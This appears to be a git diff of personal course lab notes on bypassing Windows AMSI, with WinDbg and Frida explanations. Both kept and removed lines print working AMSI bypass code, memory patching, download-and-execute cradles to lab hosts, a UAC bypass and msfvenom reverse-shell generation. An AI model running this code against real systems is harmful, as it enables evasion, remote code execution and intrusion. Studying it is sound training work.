@@ -74,12 +74,6 @@ myFunction:
   ret             ; Pop return address into EIP and jump back
 ```
 
-### Summary
-- **EIP**: Points to the next instruction to execute, controls the flow of the program.
-- **ESP**: Points to the top of the stack, manages function calls, local variables, and dynamic memory allocation.
-
-Understanding these registers is crucial for tasks such as debugging, reverse engineering, and low-level programming, where you need to closely manage and inspect the execution flow and stack state of a program.
-
 ### 64-bit Registers RIP and RSP
 
 The `RIP` (Instruction Pointer) and `RSP` (Stack Pointer) are equivalent to `EIP` and `ESP` in the x86-64 architecture (also known as x64 or AMD64), which is an extension of the x86 architecture. Here’s an explanation of `RIP` and `RSP` and how they function in the context of 64-bit computing:
@@ -142,15 +136,6 @@ myFunction:
   ret             ; Pop return address into RIP and jump back
 ```
 
-### Summary
-- **RIP (Instruction Pointer)**: 
-  - Points to the next instruction to execute in a 64-bit program.
-  - Controls the flow of the program, supporting the larger address space of 64-bit architecture.
-- **RSP (Stack Pointer)**: 
-  - Points to the top of the stack in a 64-bit program.
-  - Manages function calls, local variables, and dynamic memory allocation in the expanded 64-bit address space.
-
-Understanding `RIP` and `RSP` is essential for working with 64-bit applications, especially in areas like debugging, reverse engineering, and low-level systems programming.
 
 ### WinDdb 
 
@@ -336,10 +321,6 @@ switch (result)
 
 In this example, you call `AmsiScanBuffer`, check the result against the possible `AMSI_RESULT` values, and handle each case accordingly. This approach ensures that your application properly responds to different scan outcomes, maintaining security and adhering to administrative policies.
 
-### Conclusion
-
-AMSI is a powerful tool in the Windows security arsenal, providing a standardized way for applications to leverage antimalware capabilities to scan and block malicious content. While it has significantly improved the security of script execution and other potentially dangerous activities, it is not foolproof, and attackers continuously develop techniques to evade AMSI detection.
-
 
 ### Hooking with Frida
 
@@ -450,15 +431,8 @@ Here’s a simple example to hook a function in a Windows application using Frid
      }
      ```
 
-### Best Practices
 
-1. **Error Handling**: Ensure your scripts handle errors gracefully to avoid crashing the target process.
-2. **Logging**: Use logging to understand the behavior of the hooked functions.
-3. **Security**: Be aware of the legal and ethical implications of using Frida for reverse engineering and hooking.
-
-Frida provides a powerful and flexible framework for dynamic instrumentation, allowing you to analyze and modify the behavior of applications at runtime.
-
-#### Exercises:
+#### Example:
 	1. Modified onEnter and onExit in AmsiScanBuffer.js
 		1. If one enters 'amsiutils' in Powershell session
 
@@ -514,14 +488,6 @@ Foreach($e in $d) {if ($e.Name -like "*ms*nit*ai*") {$f=$e}}
 $g=$f.SetValue($null,$true)
 ```
 
-
-#### Exercises
-
-#### 7.3.1.1 and 7.3.1.2
-
-The assembly instruction `mov eax, 80070057h` moves the hexadecimal value `80070057h` into the `eax` register. This specific value, `0x80070057`, is a common error code in Windows that translates to `ERROR_INVALID_PARAMETER`, indicating that an invalid parameter was passed to a function.
-
-If you want to use this value in your code or in debugging scenarios, it is often useful to understand what this error code means and how to interpret it. Here's a breakdown of what the instruction does and how to use it:
 
 ### Breakdown of the Instruction
 - `mov` is an assembly instruction used to move data from one place to another.
@@ -582,19 +548,6 @@ Understanding this error code can help diagnose issues in software development, 
 ### Usage in Debugging
 When debugging, especially when analyzing crash dumps or error logs, encountering this specific value in the `eax` register or as part of a function return value can indicate that an invalid parameter was passed to a function, which can guide you towards finding the root cause of a problem.
 
-### Summary
-The instruction `mov eax, 80070057h` is used to set the `eax` register to the value `0x80070057`, a common error code in Windows programming. Understanding this error code helps in diagnosing issues related to invalid parameters in function calls.
-
-In WinDbg, the command `dc rcx L1` is used to display memory contents. Let's break down the components of this command:
-
-1. **`dc`**: This command stands for "Display memory in DWORDs." It displays the contents of memory at a specified address in DWORD (4-byte) units. 
-
-2. **`rcx`**: This is the register whose value is used as the starting address for the memory display. `rcx` is one of the general-purpose registers in x86-64 architecture.
-
-3. **`L1`**: This specifies the length of the display. `L1` means to display 1 DWORD (4 bytes) of memory starting from the address in `rcx`.
-
-So, the command `dc rcx L1` in WinDbg displays 4 bytes of memory starting at the address stored in the `rcx` register.
-
 ### Example
 If the `rcx` register contains the value `0x0000000140001000`, executing `dc rcx L1` might produce output similar to:
 
@@ -617,9 +570,9 @@ So, the command `dc rcx L1` in WinDbg displays 4 bytes of memory starting at the
 
 In the above image, the contents of AMSI Header value was overwritten.
 
-#### 7.3.1.3 Bypassing AMSI by modifying amsiContext field
+#### Bypassing AMSI by modifying amsiContext field
 
-*Note:* This works on the lab Windows 10 (build 17763), but fails with current versions
+*Note:* This works in Windows 10 (build 17763), but fails with current versions
 ```powershell
 $a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = @(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)
 ```
@@ -676,36 +629,6 @@ $a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c
    This line uses the `Marshal.Copy` method from `System.Runtime.InteropServices` to copy the content of the `$buf` (which contains just `0`) to the memory location pointed to by `$ptr`. The `0` indicates the starting index of the array, and the `1` specifies that one element (in this case, the single `0`) should be written.
 
 
-#### 7.3.2.1
-
-```powershell
-$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iInitFailed") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$f.SetValue($null,$true)
-```
-#### 7.4.1.1
-
-The command `u amsi!AmsiOpenSession L1A` in WinDbg is used to disassemble code. Here's what each part means:
-
-1. **`u`**: This command stands for "Unassemble," which means to disassemble the code at a specified address or symbol.
-    
-2. **`amsi!AmsiOpenSession`**: This specifies the starting address for the disassembly. `amsi` is the module name, and `AmsiOpenSession` is a function within that module. The exclamation mark (`!`) separates the module name from the symbol name.
-    
-3. **`L1A`**: This specifies the length of the disassembly in instructions. `L1A` means to disassemble 0x1A (26) instructions starting from the address of `AmsiOpenSession`.
-    
-
-So, the command `u amsi!AmsiOpenSession L1A` tells WinDbg to disassemble 26 instructions starting at the beginning of the `AmsiOpenSession` function within the `amsi` module.
-
-The `test rcx, rcx` instruction in assembly language is used to perform a bitwise AND operation between the `rcx` register and itself. This operation sets the processor's flags based on the result, but does not store the result anywhere. Essentially, it is used to check whether the value in `rcx` is zero or not.
-
-### Explanation
-
-- **Opcode**: `test`
-- **Operands**: `rcx, rcx`
-
-The `test` instruction performs a bitwise AND operation between its two operands and sets the Zero Flag (ZF) in the EFLAGS register accordingly:
-- If `rcx` is zero, the Zero Flag (ZF) is set to 1.
-- If `rcx` is non-zero, the Zero Flag (ZF) is cleared to 0.
-
-This is typically used to test if a register (or memory location) contains zero, without modifying the contents of the register. It is often used in conditional statements like loops or if statements to decide the flow of execution.
 
 ### Example
 
@@ -772,207 +695,3 @@ Change `rcx+8` to `0` to bypass AMSI in Windbg
 ![](Images/07-Bypassing-AMSI-Windbg-OpenSession.png)
 
 
-#### 7.4.2.1
-
-```powershell
-function LookupFunc {
-
-	Param ($moduleName, $functionName)
-
-	$assem = ([AppDomain]::CurrentDomain.GetAssemblies() | 
-    Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].
-      Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
-    $tmp=@()
-    $assem.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress") {$tmp+=$_}}
-	return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null, @($moduleName)), $functionName))
-}
-
-function getDelegateType {
-
-	Param (
-		[Parameter(Position = 0, Mandatory = $True)] [Type[]] $func,
-		[Parameter(Position = 1)] [Type] $delType = [Void]
-	)
-
-	$type = [AppDomain]::CurrentDomain.
-    DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), 
-    [System.Reflection.Emit.AssemblyBuilderAccess]::Run).
-      DefineDynamicModule('InMemoryModule', $false).
-      DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', 
-      [System.MulticastDelegate])
-
-  $type.
-    DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $func).
-      SetImplementationFlags('Runtime, Managed')
-
-  $type.
-    DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType, $func).
-      SetImplementationFlags('Runtime, Managed')
-
-	return $type.CreateType()
-}
-
-[IntPtr]$funcAddr = LookupFunc amsi.dll AmsiOpenSession
-$oldProtectionBuffer = 0
-$vp=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualProtect), (getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32].MakeByRefType()) ([Bool])))
-$vp.Invoke($funcAddr, 3, 0x40, [ref]$oldProtectionBuffer)
-$buf = [Byte[]] (0x48, 0x31, 0xC0) 
-[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $funcAddr, 3)
-$vp.Invoke($funcAddr, 3, 0x20, [ref]$oldProtectionBuffer)
-```
-
-- Download from web server 
-```powershell
- iex (New-Object Net.WebClient).DownloadString('http://192.168.45.176:8000/07AMSIBypass.ps1')
-```
-
-#### 7.4.2 Extra Mile
-
-Create a similar AMSI bypass but instead of modifying the code of _AmsiOpenSession_, find a suitable instruction to change in _AmsiScanBuffer_ and implement it from reflective PowerShell.
-- https://github.com/rasta-mouse/AmsiScanBufferBypass/blob/main/AmsiBypass.cs
-- https://github.com/rogdooley/OSEP-Code-And-Notes/blob/main/Windows/Powershell/ASBB.ps1
-
-### 7.5.2
-
-```powershell
-$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = @(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)
-
-$data = (New-Object System.Net.WebClient).DownloadData('url to dll')
-
-$assem = [System.Reflection.Assembly]::Load($data)
-$class = $assem.GetType("<namespace.class>")
-$method = $class.GetMethod("<method>")
-$method.Invoke(0, $null)
-```
-
-- used sliver to start an implant on the Student instance
-- forked a UAC Bypass implementation on github and added an Amsi Bypass class to it (https://github.com/rogdooley/SharpBypassUAC)
-```shell
-0execute-assembly /home/roger/Documents/Tools/SharpBypassUAC.exe -b fodhelper -e Y21kIC9jIGM6XHVzZXJzXE9mZnNlY1xEb3dubG9hZHNcU0hZX1BSRVNTUk9PTS5leGU=
-```
-
-```powershell
-$data = (New-Object System.Net.WebClient).DownloadData('http://192.168.45.x/UACBypass.dll')
-$assem = [System.Reflection.Assembly]::Load($data)
-$class = $assem.GetType("UACBypass.Class1")
-$method = $class.GetMethod("runner")
-$method.Invoke(0, $null)
-```
-
-
-#### 7.6.2 Is That Your Registry Key
-
-- In Windbg on current Win10 `bu jscript!JAmsi::JAmsiIsEnabledByRegistry` doesn't seem to exist
-	- In Windbg load Wmscript.exe and a malicious js file
-	- set breakpoint `bu jscript!JAmsi::JAmsiIsEnabledByRegistry`
-	- continue to breakpoing `g`
-	- throws error
-	- look in jscript.dll using `lmDvmjscript`
-	- find functions in jscript.dll  that are like jscript!j* using `x /D /f jscript!jA*`
-	
-![](Images/WindbgSearchingForJscriptAMSI.png)
-
-On Win 10 build 17763 (Offsec lab):
-![](Images/WindbgWin10B17763JscriptAmsi.png)
-- this appears to show that JAsmiIsEnabledByRegistry is no longer a function in the jscript.dll
-
-#### Windbg with wscript.exe and a malicious .js
-
-- Start debugging session
-- `bu amsi!AmsiScanBuffer`
-
-![First hit of AmsiScanBuffer in Windbg](Images/WscriptJsAmsiScanBufferHit.png)
-- look at the next 20 instructions `u rip L20`
-
-![Next 20 Instructions](Images/WindbgAmsiScanBufferNext20Instructions.png)
-
-
-### Exercise 7.6.2.3
-
-- Experiment with SharpShooter to generate the same type of payload with an AMSI bypass.
-
-- Generate raw shell code
-```bash
-msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.45.210 LPORT=9001 EXITFUNCTION=thread -f raw -o offsec-shell.txt
-```
-
-```bash
-./SuperSharpShooter.py --stageless --dotnetver 4 --rawscfile offsec-shell.txt --payload js --output ch07-offsec-test --amsi amsienable
-
-
-             _____ __                    _____ __                __
-            / ___// /_  ____ __________ / ___// /_  ____  ____  / /____  _____
-            \__ \/ __ \/ __ `/ ___/ __ \\__ \/ __ \/ __ \/ __ \/ __/ _ \/ ___/
-           ___/ / / / / /_/ / /  / /_/ /__/ / / / / /_/ / /_/ / /_/  __/ /
-     SUPER/____/_/ /_/\__,_/_/  / .___/____/_/ /_/\____/\____/\__/\___/_/
-                              /_/
-
-     Dominic Chell, @domchell, MDSec ActiveBreach, v2.0
-     SYANiDE, v3.1 Clinical Precision 
-
-[*] Preview:  var entry_class = 'Shar'+'p'+'S'+'h'+'oot'+'er';
-[*] Written delivery payload to output/ch07-offsec-test.js
-
-```
-- upload and run
-
-#### TODO: Notes to attempt build Generic Jscript AMSI Bypass
-
-- Win11 CLSID for jscript.dll is different than in Win10 `Computer\HKEY_CLASSES_ROOT\CLSID\{cc5bbec3-db4a-4bed-828d-08d78ee3e1ed}\InprocServer32`
-- Newer Win10 builds don't query the AMSI bypass registry setting
-	- amsi.dll is called for analysis
-
-
-#### Preventing AMSI from loading or load another version
-
-- Using Windbg can show that amsi.dll is loaded from System32 using LoadLibraryExW where `R8` is set to `0x800` which is the enum `LOAD_LIBRARY_SEARCH_SYSTEM32`.
-- If the system sees another amsi.dll is loaded, the real amsi.dll will fail to load
-- Copy wscript.exe to amsi.dll outside of C:\\Windows\\System32 and then use the WScript `Exec` method which is a wrapper for `CreateProcess` Win32 API. `CreateProcess` ignores the file extension and parses the file header to determine if the object called can run.
-
-##### Example code:
-```vb
-var filesys= new ActiveXObject("Scripting.FileSystemObject");
-var sh = new ActiveXObject('WScript.Shell');
-try
-{
-	if(filesys.FileExists("C:\\Windows\\Tasks\\AMSI.dll")==0)
-	{
-		throw new Error(1, '');
-	}
-}
-catch(e)
-{
-	filesys.CopyFile("C:\\Windows\\System32\\wscript.exe", "C:\\Windows\\Tasks\\AMSI.dll");
-	sh.Exec("C:\\Windows\\Tasks\\AMSI.dll -e:{F414C262-6AC0-11CF-B6D1-00AA00BBBB58} "+WScript.ScriptFullName);
-	WScript.Quit(1);
-}
-```
-
-- *However*, Windows Defender still flags the code and will terminate execution unless one migrates the process or uses a payload that performs process injection or hollowing
-
-### Exercises 7.6.3
-
-1. Recreate the AMSI bypass by renaming wscript.exe to "amsi.dll" and executing it.
-2. Instead of a regular shellcode runner, implement this bypass with a process injection or hollowing technique and obtain a Meterpreter shell that stays alive after the detection.
-
-#### NtQueryInformationProcess
-```cpp
-__kernel_entry NTSTATUS NtQueryInformationProcess(
-  [in]            HANDLE           ProcessHandle,
-  [in]            PROCESSINFOCLASS ProcessInformationClass,
-  [out]           PVOID            ProcessInformation,
-  [in]            ULONG            ProcessInformationLength,
-  [out, optional] PULONG           ReturnLength
-);
-```
-
-#### ZwQueryInformationProcess
-```cpp
-NTSTATUS WINAPI ZwQueryInformationProcess(
-  _In_      HANDLE           ProcessHandle,
-  _In_      PROCESSINFOCLASS ProcessInformationClass,
-  _Out_     PVOID            ProcessInformation,
-  _In_      ULONG            ProcessInformationLength,
-  _Out_opt_ PULONG           ReturnLength
-);
-```
